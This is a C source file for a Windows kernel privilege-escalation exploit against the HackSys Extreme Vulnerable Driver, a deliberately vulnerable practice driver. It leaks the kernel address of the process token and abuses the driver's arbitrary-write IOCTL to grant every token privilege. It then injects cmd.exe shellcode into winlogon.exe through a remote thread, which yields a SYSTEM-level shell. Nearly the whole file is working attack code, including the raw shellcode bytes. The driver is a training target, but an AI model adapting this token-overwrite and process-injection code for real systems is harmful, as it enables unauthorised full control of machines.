#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <winternl.h>
#include <ntstatus.h>
#include <tlhelp32.h>


#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802)
#define SystemHandleInformation 0x10

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    ULONG ProcessId;          
    UCHAR ObjectTypeNumber;   
    UCHAR Flags;
    USHORT Handle;            
    void* Object;             
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE Handels[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct {
    LPVOID PopRcxRet;
    LPVOID Cr4RegValue;
    LPVOID MovCr4EcxRet;
} ROP, * PROP;

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

typedef struct _WRITE_WHAT_WHERE
{
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;



DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return NULL;
    }
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        printf("outBuffer 0x%x\n", outBuffer);
        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("\t[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;
        
        if (buffer->Handels[i].ProcessId == GetCurrentProcessId())
        { 
            printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
            if (buffer->Handels[i].ObjectTypeNumber == type)
            {
                if (handle == (HANDLE)buffer->Handels[i].Handle)
                {
                    DWORD64 object = (DWORD64)buffer->Handels[i].Object;
                    free(buffer);
                    return object;
                }
            }
        }
    }
    printf("\t[-] handle not found\n");
    free(buffer);
    return 0;
}

// run cmd.exe
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }
    printf("[+] PID: 0x%x\n", pid);
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }

    if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}

PUCHAR GetKernelBase() 
{
    LPVOID drivers[1000];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, 1000, &cbNeeded);
    PUCHAR kernelBaseAddr = (PUCHAR)drivers[0];
    
    return kernelBaseAddr;
}

int main() {
    HANDLE driverHandle;
    LPVOID lpvPayload;
    ROP DisableSMEP, EnableSMEP;
    PUCHAR pKernelBase = GetKernelBase();
    printf("[+] Kernel base address @  0x%p\n", pKernelBase);

    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc)
    {
        printf("\t[-] OpenProcess failed\n");
        return 0;
    }
    HANDLE token = 0;
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
    {
        printf("\t[-] OpenProcessToken failed\n");
        return 0;
    }
    printf("[+] proc @  0x%p\n", token);
    
    DWORD64 ktoken = GetKernelPointer(token, 0x5);
    DWORD64 dwTargetOffset = ktoken + 0x40;
    printf("[+] found token at: %p\n", ktoken);
    printf("[+] The target token offest is %p\n", dwTargetOffset);


    // target for practice
    PULONG_PTR WRITE_BUF = (PULONG_PTR)VirtualAlloc(
        NULL, 
        0x1000, 
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("[+] Address of WRITE_BUF: 0x%p\n", WRITE_BUF);
    SecureZeroMemory(WRITE_BUF, 0x1000);
    memset(WRITE_BUF, 0x42, 0x100);

    PWRITE_WHAT_WHERE www = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(WRITE_WHAT_WHERE));

    if (!www) {
        printf("\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
    printf("[+] Address of www: 0x%p\n", www);
    char Blah[] = "\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78";
    UINT64 uAllPrivelage = 0xffffffffffffffff;
    www->What = (PULONG_PTR)&uAllPrivelage;
    www->Where = (PULONG_PTR)dwTargetOffset;
    //www->What = (PULONG_PTR)&uAllPrivelage;
    //www->Where = (PULONG_PTR)WRITE_BUF;


    //memcpy(WRITE_BUF, &www, sizeof(www));
    printf("[+] WRITE_BUF[0]: 0x%llx\n", WRITE_BUF[0]);
    printf("[+] WRITE_BUF[1]: 0x%llx\n", WRITE_BUF[1]);



    printf("[*] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        return 0;
    }
    printf("[+] Send payload with IOCTL code: 0x%llx\n", HEVD_IOCTL_ARBITRARY_WRITE);
    if (!DeviceIoControl(driverHandle,     // Device to be queried
        HEVD_IOCTL_ARBITRARY_WRITE,         // Operation to perform
        (LPVOID)www, sizeof(WRITE_WHAT_WHERE),                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    )) {
        printf("\t[-] Error sending IOCTL to driver\n");
        return 0;
    }
    

    printf("[+] WRITE_BUF[0]: 0x%llx\n", WRITE_BUF[0]);
    printf("[+] WRITE_BUF[1]: 0x%llx\n", WRITE_BUF[1]);
    
    dwTargetOffset += 0x8;
    www->Where = (PULONG_PTR)dwTargetOffset;
    printf("[+] Send payload with IOCTL code: 0x%llx\n", HEVD_IOCTL_ARBITRARY_WRITE);
    if (!DeviceIoControl(driverHandle,     // Device to be queried
        HEVD_IOCTL_ARBITRARY_WRITE,         // Operation to perform
        (LPVOID)www, sizeof(WRITE_WHAT_WHERE),                        // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    )) {
        printf("\t[-] Error sending IOCTL to driver\n");
        return 0;
    }
    
    InjectToWinlogon();
    
    
    HeapFree(GetProcessHeap(), 0, www);
    while (1);
    return 0;
}